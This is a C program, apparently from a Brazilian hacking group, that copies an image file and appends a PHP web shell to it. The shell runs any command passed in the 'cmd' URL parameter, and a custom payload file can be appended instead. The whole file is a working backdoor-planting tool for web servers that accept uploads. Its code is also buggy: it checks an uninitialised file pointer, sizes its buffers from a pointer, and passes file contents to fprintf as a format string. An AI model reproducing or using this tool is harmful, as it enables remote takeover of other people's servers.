/*
MIT License
Copyright (c) 2018 Adriel Freud
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
----------------------------------
# Desenvolvido por Adriel Freud!
# Contato: businessc0rp2k17@gmail.com
# FB: http://www.facebook.com/xrn401
#   =>DebutySecTeamSecurity<=
----------------------------------
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define shell "<?php if($_GET){system($_GET['cmd']);}?>"

void banner(void){
	printf("\n\n---------------------------------------------\n\n");
  	printf("\t# Desenvolvido por Adriel Freud!\n");
	printf("\t# Contato: businessc0rp2k17@gmail.com\n");
	printf("\t# FB: http://www.facebook.com/xrn401\n");
	printf("\t   =>DebutySecTeamSecurity<=\n");
	printf("\n---------------------------------------------\n\n");
}

void fatal(char *msng){
	fprintf(stderr, "[WARNING] - %s\n", msng);
	exit(0);
}

int main(int argc, char *argv[]){
	if(argc < 3){
		banner();
		fatal("Modo de Uso: root@localhost~# ./createShell imagem.php output.php");
		exit(0);

	}else{

		FILE *output;
		FILE *img;
		char size_i[sizeof(img)];

		if (img == NULL){
			banner();
			fatal("\nArquivo Nao Encontrado!");
			fclose(img);
			fclose(output);
			exit(0);

		}else{

			output = fopen(argv[2], "wb");
			img = fopen(argv[1], "rb");
			while(fgets(size_i, sizeof(img), img) != NULL){
				fprintf(output, size_i);
			}
			if(argc > 3){

				FILE *open_shell = fopen(argv[3], "rb");
				char size_sh[sizeof(open_shell)];

				while(fgets(size_sh, sizeof(open_shell), open_shell) != NULL){
					fprintf(output, size_sh);
				}
				fclose(open_shell);
			}else{
				fprintf(output, shell);
			}
			fclose(img);
			fclose(output);
			return 0;
		}
	}
}
